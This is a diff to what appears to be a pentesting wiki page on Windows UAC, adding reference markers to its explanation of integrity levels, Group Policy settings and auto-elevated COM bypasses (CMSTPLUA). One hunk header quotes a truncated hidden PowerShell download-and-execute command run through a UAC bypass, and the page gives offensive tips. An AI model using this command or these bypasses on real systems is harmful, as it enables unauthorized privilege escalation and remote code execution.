@@ -4,7 +4,7 @@
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.<sup>[[2]](#references)</sup>
 
 For more info about integrity levels:
 
@@ -15,7 +15,7 @@ For more info about integrity levels:
 
 When UAC is in place, an administrator user is given 2 tokens: a standard user token, to perform regular actions at medium integrity, and one with the admin privileges.
 
-This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
+This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture.<sup>[[2]](#references)</sup> Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
 
 | Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
@@ -161,7 +161,7 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)
 
-Auto-elevated COM objects remain a practical UAC surface on modern builds. `ICMLuaUtil` is still tracked by UACME as working on current Windows branches, and offensive tooling keeps adapting `CMSTPLUA` by combining an interactive desktop process, 64-bit execution, and sometimes PEB/process masquerading before invoking the COM Elevation Moniker.
+Auto-elevated COM objects remain a practical UAC surface on modern builds. `ICMLuaUtil` is still tracked by UACME as working on current Windows branches, and offensive tooling keeps adapting `CMSTPLUA` by combining an interactive desktop process, 64-bit execution, and sometimes PEB/process masquerading before invoking the COM Elevation Moniker.<sup>[[3]](#references)</sup>
 
 Practical tips:
 - Prefer a **64-bit** process in the user's **interactive session** (commonly `explorer.exe` or a child of it).
